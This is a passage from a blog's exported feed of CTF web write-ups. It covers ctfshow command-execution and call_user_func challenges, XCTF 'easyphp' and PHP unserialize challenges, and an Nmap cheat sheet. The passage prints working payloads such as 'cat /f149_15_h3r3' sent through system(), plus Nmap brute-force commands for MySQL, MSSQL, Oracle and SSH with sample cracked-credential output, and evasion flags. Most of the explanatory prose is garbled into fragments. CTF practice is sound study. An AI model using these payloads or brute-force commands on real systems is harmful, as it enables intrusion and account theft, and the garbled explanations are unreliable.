<span class="token function">system</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>payload<br>?c&#x3D;cat &#x2F;f149_15_h3r3;<br><strong>tee</strong></p><p><img src="https://img-blog.csdnimg.cn/ef21c0b92cfa4020a35d2eecd96c810a.png" alt="1"><br><img src="https://img-blog.csdnimg.cn/155bbf7015c644e78f91879a196f54ff.png" alt="2"></p><p><strong></strong><br><a href="https://www.runoob.com/linux/linux-comm-sed.html">sed</a><br><img src="https://img-blog.csdnimg.cn/bcf4813af45545da88e99629f676795d.png" alt="3"><br><a href="https://www.runoob.com/linux/linux-comm-xargs.html">xargs</a></p><h2 id="web138"><a href="#web138" class="headerlink" title="web138"></a>web138</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">ctfshow</span><span class="token punctuation">&#123;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private class"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">static</span> <span class="token keyword">function</span> <span class="token function-definition function">getFlag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"flag.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strripos</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">":"</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"private function"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">call_user_func</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'ctfshow'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>::<code>ctfshow=stfshow::getFlag</code><br>call_user_funcphp<br><img src="https://img-blog.csdnimg.cn/b1a697d445cb4291a8ff69bf33f07212.png" alt="1"><br>call_user_func<br>payload<code>POST ctfshow[0]=ctfshow&amp;ctfshow[1]=getFlag</code><br><img src="https://img-blog.csdnimg.cn/85b359077b3f45c888d616edab8888af.png" alt="4"></p>]]></content>
      
      
      <categories>
          
          <category> ctfshow </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nmap</title>
      <link href="/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
      <url>/2023/03/23/Nmap%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id=""><a href="#" class="headerlink" title=""></a></h2><blockquote><p>nmap 0.0.0.0IP</p></blockquote><p>nmaparpping0-1000<a href="https://blog.csdn.net/qq_47125775/article/details/108433224">arp</a></p><blockquote><p>nmap ip ip<br> nmap 0.0.0.0 1.1.1.1</p></blockquote><p>IP</p><blockquote><p>nmap -p () IP<br> nmap -p 80,20-200 1.1.1.1</p></blockquote><p></p><blockquote><p>nmap 192.168.227.1&#x2F;24 -exclude 192.168.227.1</p></blockquote><p>ip</p><blockquote><p>nmap -sL 192.168.227.1&#x2F;24</p></blockquote><p></p><blockquote><p>namp -sp 1.1.1.1-255</p></blockquote><p>IP(ping)</p><blockquote><p>nmap -sS 1.1.1.1<br> Tcp SYN Scan (sS) ,NmapNmapSYN.<strong></strong>,SYN.Nmap,Tcp SYN.root&#x2F;administrator</p></blockquote><p>SYN</p><blockquote><p>namp -sT 192.168.227.154<br> Tcp SYN,Tcp connect(),connect().Tcp connect()<strong>TCPUDP</strong></p></blockquote><p>TCP</p><blockquote><p>nmap -sU 192.168.206.124<br> <strong>UDP</strong>.SYNUDPUDPUDP,ICMP.</p></blockquote><p>UDP</p><blockquote><p>nmap -sV 192.168.206.135<br> <strong>..TCPSYN67.86IP</strong></p></blockquote><p>Version</p><blockquote><p>nmap -O 192.168.126.206</p></blockquote><p>OS</p><blockquote><p>nmap -O -PN 192.168.206.124<br> IDSIPS-PNpingping.-PNNmapping-PNPING,<br> c9</p></blockquote><p>NO ping </p><blockquote><p>10.1.1.0&#x2F;24 &#x3D; 10.1.1.1-10.1.1.255 #c<br> 10.1.1.0&#x2F;16 &#x3D; 10.1.1.1-10.1.255.255 #b<br> 10.1.1.0&#x2F;8 &#x3D; 10.1.1.1-10.255.255.255 #a</p></blockquote><p><strong></strong></p><blockquote><p>nmap -iL ip-address.txt</p></blockquote><p></p><h2 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h2><p>MYSQL</p><blockquote><p>nmap script&#x3D;mysql-brute <target></p></blockquote><blockquote><p>3306&#x2F;tcp open  mysql<br> | mysql-brute:<br> |   Accounts<br> |     root:root - Valid credentials</p></blockquote><p>MsSQL</p><blockquote><p>nmap -p 1433 script ms-sql-brute script-args userdb&#x3D;customuser.txt,passdb&#x3D;custompass.txt <host></p></blockquote><blockquote><p>| ms-sql-brute:<br> |   [192.168.100.128\TEST]<br> |     No credentials found<br> |     Warnings:<br> |       sa: AccountLockedOut<br> |   [192.168.100.128\PROD]<br> |     Credentials found:<br> |       webshop_reader:secret &#x3D;&gt; Login Success<br> |       testuser:secret1234 &#x3D;&gt; PasswordMustChange<br> |_      lordvader:secret1234 &#x3D;&gt; Login Success</p></blockquote><p>Oracle</p><blockquote><p>nmap script oracle-brute -p 1521 script-args oracle-brute.sid&#x3D;ORCL <host></p></blockquote><blockquote><p>PORT     STATE  SERVICE REASON<br> 1521&#x2F;tcp open  oracle  syn-ack<br> | oracle-brute:<br> |   Accounts<br> |     system:powell &#x3D;&gt; Account locked<br> |     haxxor:haxxor &#x3D;&gt; Valid credentials<br> |   Statistics<br> |_    Perfomed 157 guesses in 8 seconds, average tps: 19</p></blockquote><p>SSH</p><blockquote><p>nmap -p 22 script ssh-brute script-args userdb&#x3D;users.lst,passdb&#x3D;pass.lst script-args ssh-brute.timeout&#x3D;4s <target></p></blockquote><blockquote><p>22&#x2F;ssh open  ssh<br> | ssh-brute:<br> |  Accounts<br> |    username:password<br> |  Statistics<br> |_   Performed 32 guesses in 25 seconds.</p></blockquote><p>DNS</p><blockquote><p>nmap script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a></p></blockquote><blockquote><p> nmap script dns-brute <a href="http://www.baidu.com/">www.baidu.com</a><br> Starting Nmap 7.50 ( <a href="https://nmap.org/">https://nmap.org</a> ) at 2017-07-25 13:12 ?<br> Nmap scan report for <a href="http://www.baidu.com/">www.baidu.com</a> (180.97.33.108)<br> Host is up (0.018s latency).<br> Other addresses for <a href="http://www.baidu.com/">www.baidu.com</a> (not scanned): 180.97.33.10<br> Not shown: 998 filtered ports<br> PORT    STATE SERVICE<br> 80&#x2F;tcp  open  http<br> 443&#x2F;tcp open  https<br> Host script results:<br> | dns-brute:<br> |   DNS Brute-force hostnames:<br> |     admin.baidu.com - 10.26.109.19<br> |     mx.baidu.com - 61.135.163.61<br> |     svn.baidu.com - 10.65.211.174<br> |     ads.baidu.com - 10.42.4.225<br> Nmap done: 1 IP address (1 host up) scanned in 92.64 seconds</p></blockquote><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p>Nmap,ip,<br> :blah.highon.coffee, namp.org&#x2F;24, 192.168.0.1;10.0.0-25.1-254</p><blockquote><p>-iL filename                    ,,ip,<br> -iR hostnum                     ,.-iR0,<br> exclude host1[, host2]        <br> exculdefile exclude_file      IP,-iL</p></blockquote><p></p><blockquote><p>-sL                     ,IP,<br> -sn                     ping,<br> -Pn                     <br> -PS&#x2F;PA&#x2F;PU&#x2F;PY[portlist]  TCP SYN Ping&#x2F;TCP ACK Ping&#x2F;UDP Ping<br> -PE&#x2F;PP&#x2F;PM               ICMP echo, timestamp and netmask <br> -PO[prococol list]      IP<br> -n&#x2F;-R                   IP&#x2F;IP</p></blockquote><p></p><blockquote><p>-sS&#x2F;sT&#x2F;sA&#x2F;sW&#x2F;sM                 TCP SYN&#x2F;TCP connect()&#x2F;ACK&#x2F;TCP&#x2F;TCP Maimon<br> -sU                             UDP<br> -sN&#x2F;sF&#x2F;sX                       TCP NullFINand Xmas<br> scanflags                     TCPflags<br> -sI zombie host[:probeport]     Idlescan<br> -sY&#x2F;sZ                          SCTP INIT&#x2F;COOKIE-ECHO <br> -sO                             IP protocol <br> -b FTP relay host             FTP bounce scan</p></blockquote><p></p><blockquote><p>-p                       -p80,443  -p1-65535<br> -p U:PORT               udp, -p U:53<br> -F                      ,<br> -r                      ,<br> top-ports number    number,nmap-services,ubuntu&#x2F;usr&#x2F;share&#x2F;nmap.nmap1000<br> port-ratio ratio    </p></blockquote><p></p><blockquote><p>-sV                             ,-A<br> version-intensity level     ,7<br> version-light                 ,version-intensity 2<br> version-all                   ,version-intensity 9<br> version-trace                 </p></blockquote><p></p><blockquote><p>-sC                             ,<br> script&#x3D;Lua scripts          <br> script-args&#x3D;n1&#x3D;v1,[n2&#x3D;v2]     <br> script-args-file&#x3D;filename     <br> script-trace                  <br> script-updatedb               <br> script-help&#x3D;Lua script      </p></blockquote><p>OS</p><blockquote><p>-O              ,-A<br> osscan-limit  (openclosed)<br> osscan-guess  ,NmapNmap<br> &#x2F;IDS<br> -f; mtu value                 MTU.<br> -D decoy1,decoy2,ME             <br> -S IP-ADDRESS                   <br> -e interface                    <br> -g&#x2F; source-port PROTNUM       <br> proxies url1,[url2],       HTTPSOCKS4</p></blockquote><blockquote><p>data-length NUM               NUM<br> ip-options OPTIONS            IP<br> ttl VALUE                     IP time-to-live<br> spoof-mac ADDR&#x2F;PREFIX&#x2F;VEBDOR  MAC<br> badsum                        checksum<br> Nmap <br> -oN                     <br> -oX                     xml<br> -oS                     <br> -oG                     bashperl,xml<br> -oA BASENAME            XMLGrep<br> -v                      <br> -d level                debug,9<br> reason                <br> open                  open<br> packet-trace          <br> iflist                ,<br> log-errors            errors&#x2F;warings<br> append-output         <br> resume FILENAME       <br> stylesheet PATH&#x2F;URL   XSLXML<br> webxml                namp.orgXML<br> no-sytlesheet         XMLXSL</p></blockquote><p>nmap</p><blockquote><p>-6                      IPv6<br> -A                      OS,,traceroute<br> datedir DIRNAME       Nmap<br> send-eth &#x2F; send-ip  &#x2F;IP<br> privileged            <br> unprovoleged          ,root<br> -V                      <br> -h                      </p></blockquote>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>-web</title>
      <link href="/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/"/>
      <url>/2023/03/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-web/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="easyphp"><a href="#easyphp" class="headerlink" title="easyphp"></a>easyphp</h2><p><img src="https://img-blog.csdnimg.cn/777b9016dc7d4931934149f054da6fb2.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$key1</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>            <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Emmm..."</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$d</span> <span class="token operator">===</span> <span class="token constant boolean">false</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no..."</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span> <span class="token keyword">as</span> <span class="token variable">$key</span><span class="token operator">=></span><span class="token variable">$val</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>            <span class="token variable">$val</span><span class="token operator">===</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token operator">?</span><span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no......"</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token class-name return-type">NULL</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token variable">$key2</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no hack"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"no"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$key1</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$key2</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"Hgfks.php"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token string double-quoted-string">"You're right"</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span>    <span class="token keyword">echo</span> <span class="token variable">$flag</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>a&#x3D;9e9</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">intval</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">6000000</span> <span class="token operator">&amp;&amp;</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token operator">&lt;=</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span><span class="token number">1000000</span> <span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'8b184b'</span> <span class="token operator">===</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">,</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;br>'</span><span class="token operator">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><img src="https://img-blog.csdnimg.cn/be82814851a4407c84b59756e4a81c42.png" alt="2"><br>b&#x3D;53724</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token keyword type-casting">array</span><span class="token punctuation">)</span><span class="token function">json_decode</span><span class="token punctuation">(</span>@<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">#json</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>json<a href="https://zhuanlan.zhihu.com/p/74151127">JSON</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token operator">!</span><span class="token function">is_numeric</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"m"</span><span class="token punctuation">]</span> <span class="token operator">></span> <span class="token number">2022</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>c&#x3D;{m:2222c}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_array</span><span class="token punctuation">(</span>@<span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">2</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_array</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>c&#x3D;{m:2222c,n:[[1],0]}</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token variable">$d</span> <span class="token operator">=</span> <span class="token function">array_search</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"DGGJ"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"n"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>flase$c[n]&#x3D;0(null)0<br><strong>c&#x3D;{m:2222c,n:[[],0]}</strong><br>payload<code>http://61.147.171.105:54356?a=9e9&amp;b=53724&amp;c=&#123;&quot;m&quot;:&quot;2222c&quot;,&quot;n&quot;:[[0],0]&#125;</code></p><p><img src="https://img-blog.csdnimg.cn/4707ba60885b4bab8b4c6a5e663060b4.png" alt="3"></p><h2 id="Web-php-unserialize"><a href="#Web-php-unserialize" class="headerlink" title="Web_php_unserialize"></a>Web_php_unserialize</h2><p><img src="https://img-blog.csdnimg.cn/e550b56fa030492b9f805746e000103b.png" alt="1"></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token keyword">class</span> <span class="token class-name-definition class-name">Demo</span> <span class="token punctuation">&#123;</span>     <span class="token keyword">private</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">__construct</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token variable">$file</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">echo</span> @<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span><span class="token punctuation">,</span> <span class="token constant boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span>    <span class="token keyword">function</span> <span class="token function-definition function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">!=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>             <span class="token comment">//the secret is in the fl4g.php</span>            <span class="token variable">$this</span><span class="token operator">-></span><span class="token property">file</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'index.php'</span><span class="token punctuation">;</span>         <span class="token punctuation">&#125;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>     <span class="token variable">$var</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'var'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/[oc]:\d+:/i'</span><span class="token punctuation">,</span> <span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>         <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'stop hacking!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>        @<span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$var</span><span class="token punctuation">)</span><span class="token punctuation">;</span>     <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>     <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"index.php"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token delimiter important">?></span></span><span aria-hidden="true" 